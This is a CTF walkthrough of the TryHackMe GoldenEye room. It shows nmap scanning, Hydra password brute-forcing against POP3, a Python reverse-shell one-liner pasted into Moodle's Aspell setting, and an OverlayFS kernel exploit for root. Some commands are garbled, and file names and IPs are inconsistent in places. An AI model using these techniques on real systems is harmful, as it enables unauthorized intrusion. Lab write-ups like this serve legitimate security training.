# Walkthrough

Hi everyone! I'm **Yuvraj Singh**, and in this walkthrough, we'll be solving the **GoldenEye** room on **TryHackMe**. Inspired by the James Bond universe, this room takes us through a realistic penetration testing scenario involving enumeration, credential discovery, web application exploitation, and privilege escalation until we obtain root access.

We'll begin by connecting to the TryHackMe VPN, deploying the target machine, and waiting for its IP address to be assigned (this may take a minute). Once the machine is ready, we'll systematically enumerate the target, exploit the identified vulnerabilities, and explain the reasoning behind every step along the way.

website - https://www.tryhackme.com

room - https://www.tryhackme.com/room/goldeneye

## Task 1 - Enumeration

After deploying the machine and connecting to the TryHackMe VPN, the first step is to perform a complete port scan.

```
nmap -A -Pn -p- 10.49.156.169 -T5
```

<img width="1342" height="662" alt="image" src="https://github.com/user-attachments/assets/80d8113d-e565-4eb4-acd9-2ebb6a58061a" />

The scan reveals **open ports**, answering the first question.

Accessing the ip on port 80 through Firefox we get to this page:

<img width="589" height="277" alt="image" src="https://github.com/user-attachments/assets/ccdf9455-596d-42e0-82ad-2ab556863f24" />

Inspect the page source (`Ctrl+Shift+I`) and notice that an external JavaScript file named **script.js** is being loaded.

Open the script:

```
http://10.49.156.169/terminal.js
```

Inside the JavaScript file, there are several developer comments.

<img width="1024" height="759" alt="image" src="https://github.com/user-attachments/assets/3e47a832-5b2e-4a73-a7e7-6215b50c8f23" />

From these comments we learn:

- Boris is reminded to change his default password.
- A Base64 + HTML ASCII encoded string is present.

Use any online decoder.

This reveals Boris' default password.

---

## Finding the Login Page

Browsing the website reveals another page:

```
/sev-home/
```

Attempt to log in using Boris' credentials in /sev-home/ is successful.

Attempt to log in using Boris' credentials in pop3 mail server is unsuccessful.

At this point the room hints that another service should be investigated.

---

## POP3 Enumeration

Since one of the open ports is running POP3, perform password attacks using Hydra.

```
# hydra -l boris -P /usr/share/wordlists/fasttrack.txt pop3://10.49.156.169:55007
[...]
[55007][pop3] host: 10.10.252.31   login: boris   password: secret1!
1 of 1 target successfully completed, 1 valid password found
```

The correct credentials are recovered.

Next, remember the developer comment mentioning **Natalia** being able to crack Boris' passwords.

Perform another Hydra attack against Natalia's account.

```
hydra-l natalia-P /usr/share/wordlists/fasttrack.txt pop3://10.49.156.169:55007
```

<img width="922" height="185" alt="image" src="https://github.com/user-attachments/assets/bfd364a4-78f4-4868-9cdc-4aab8e9c7f49" />

---

## Reading POP3 Emails

Instead of using a dedicated email client, connect directly using Netcat. I found Natalya’s password easier to type so tried Natalya first.

```
nc 10.49.156.169 55007
```

Authenticate:

```
USER natalia
PASS bird
```

Useful POP3 commands:

```
LIST
RETR 1
RETR 2
QUIT
```

There are **two emails** available.

<img width="523" height="215" alt="image" src="https://github.com/user-attachments/assets/45f2d1f3-345c-494b-a6d5-e7d4c8b7ce60" />

<img width="1572" height="637" alt="image" src="https://github.com/user-attachments/assets/5780621d-50de-4447-88e4-0c802930bed1" />

One of the emails contains credentials for another web application hosted on a virtual host.

It also mentions that Linux will not resolve the hostname automatically.

---

## Updating /etc/hosts

Edited your hosts file and added in the end:.

```
sudo nano /etc/hosts
10.49.156.169 severnaya-station.com
```

Save the file (ctrl+o followed by ctrl+x).

Now browse to:

```
http://severnaya-station.com/gnocertdir
```

---

# Task 2 - Moodle Enumeration

Using credentials recovered from Natalia's email, log into the Moodle instance.

<img width="1616" height="536" alt="image" src="https://github.com/user-attachments/assets/de9c0cc4-43b7-4133-bab5-762cb6017bd2" />

After exploring the portal, notice that your account has very limited privileges.

However, there are messages from another user:

**Doak**

This becomes our next target.

---

## Brute Forcing Doak

Attack the POP3 service again.

```
hydra-l doak-P /usr/share/wordlists/fasttrack.txt pop3://10.49.156.169:55007
```

Login through POP3 once more.

```
nc 10.49.156.169 55007
```

Read the available emails.

<img width="1030" height="487" alt="image" src="https://github.com/user-attachments/assets/a90b763d-cb44-45a2-ae51-60d44acc8a5e" />

One email contains another Moodle account with elevated privileges.

Log into Moodle using these newly recovered credentials.

<img width="1645" height="478" alt="image" src="https://github.com/user-attachments/assets/01b15a7a-0809-467f-88a9-9feead887aca" />

---

# Task 3 - Gaining Administrator Access

While exploring Dr. Doak's account, navigate through the available content.

Inside Doak's office is a file named:

```
secret.txt
```

Download it.

```
007,

I was able to capture this apps adm1n cr3ds through clear txt.

Text throughout most web apps within the GoldenEye servers are scanned, so I cannot add the cr3dentials here.

Something juicy is located here: /dir007key/for-007.jpg

Also as you may know, the RCP-90 is vastly superior to any other weapon and License to Kill is the only way to play.
```

Something juice …? It’s obviously hinting to the admin’s password. The file references an image stored in another directory.

Navigate to the provided path.

```
http://10.49.156.169/dir007key/for-007.jpg
```

The image itself appears harmless.

Download it.

<img width="315" height="214" alt="image" src="https://github.com/user-attachments/assets/a34d11f5-995c-459d-bf8c-af53198382f9" />

Inspect its metadata using either:

```
exiftool image.jpg
```

or an online metadata viewer.

Within the metadata description is another Base64 encoded string.

```
eFdpbnRlcjE5OTV4IQ==
```

Decode it. The decoded string reveals the administrator password.

Log into Moodle as the administrator.

<img width="277" height="132" alt="image" src="https://github.com/user-attachments/assets/dfd86078-eadd-49ca-a94e-2bec7b048d4b" />

---

# Task 4 - Remote Code Execution

With administrative privileges, search through Moodle's settings.

There were many plugins in there. Search for spellchecker plugin

<img width="497" height="622" alt="image" src="https://github.com/user-attachments/assets/24a6e45a-5ca7-4163-b8c3-3a4ebac80e0d" />

Found it

Now use the search option below and search for:

```
spell
```

Several things appeared. The relevant one is related to **Spell Engine (Aspell)**.

The room hints that Aspell can be abused.

Search Exploit-DB for the Moodle spellchecker exploit and obtain the exploit script.

```python
python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("192.168.157.65",1234));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);’
```

Modify the payload so it connects back to your VPN IP and listening port.

Example listener:

```
nc -lvnp 1234
```

Update the reverse shell payload with:

- Your VPN IP
- Port 1234

Upload or paste the payload into the path to Aspell configuration field.

<img width="1478" height="557" alt="image" src="https://github.com/user-attachments/assets/797350c5-7f3f-45b0-8e1b-514dbc0158fc" />

Trigger the vulnerable functionality by adding entry in blog and triggering the spellcheck plugin.

The reverse shell connects successfully.

<img width="562" height="86" alt="image" src="https://github.com/user-attachments/assets/5b9d201b-ab9c-4ddd-ac82-4d32e454e895" />

Verify your access.

```
whoami
```

---

# Task 5 - Privilege Escalation

Begin by identifying the kernel version.

```
uname -a
```

The kernel version is vulnerable to a known OverlayFS privilege escalation.

Search Exploit-DB for the corresponding exploit.

Download the C source.

<img width="1735" height="246" alt="image" src="https://github.com/user-attachments/assets/1163c94d-3a59-43f3-8714-9f88c52734a4" />

Upload the exploit to the target, preferably inside `/tmp`.

```
cd /tmp
```

Verify a compiler is installed.

```
gcc --version
```

and

```
cc --version
```

Compile the exploit.

```
cc exploit.c -o exploit
```

Some compiler warnings may appear, but compilation succeeds.

Execute it.

```
./exploit
```

A root shell is obtained.

Verify:

```
whoami
```

<img width="276" height="86" alt="image" src="https://github.com/user-attachments/assets/062aa0a1-2772-4d77-9003-2c33d7300055" />

Navigate to the root directory.

```
cd /root
```

Initially, no obvious flag appears. I felt a bit of trauma here but decided to look for hidden files as it’s a medium level challenge ctf.

Listing hidden files reveals an interesting file.

```
ls -la
```

Read it.

```
cat .flag.txt
```

<img width="537" height="264" alt="image" src="https://github.com/user-attachments/assets/0095e682-5e18-41b4-848b-54cf0877802a" />

---

# Final Objective

The room instructs you to visit the final URL.

<img width="537" height="100" alt="image" src="https://github.com/user-attachments/assets/4f37ca7e-2e3b-42e2-89a5-0ce3bbb8dc40" />

Open:

```
/006-final/xvf7-flag/
```

<img width="1645" height="728" alt="image" src="https://github.com/user-attachments/assets/488a92cd-0072-4ba8-be1d-342637d21cad" />

The page confirms successful completion of the mission.

---

# Conclusion

This room combines multiple stages of a realistic penetration test, including:

- Network enumeration with Nmap
- Source code analysis
- Base64 decoding
- POP3 enumeration
- Password attacks using Hydra
- Virtual host discovery
- Reading email contents
- Metadata analysis
- Moodle administration abuse
- Remote Code Execution
- Linux privilege escalation using an OverlayFS vulnerability

Overall, **GoldenEye** is an excellent medium-difficulty room that demonstrates how seemingly small pieces of information developer comments, emails, metadata, and misconfigurations can be chained together to achieve full system compromise.
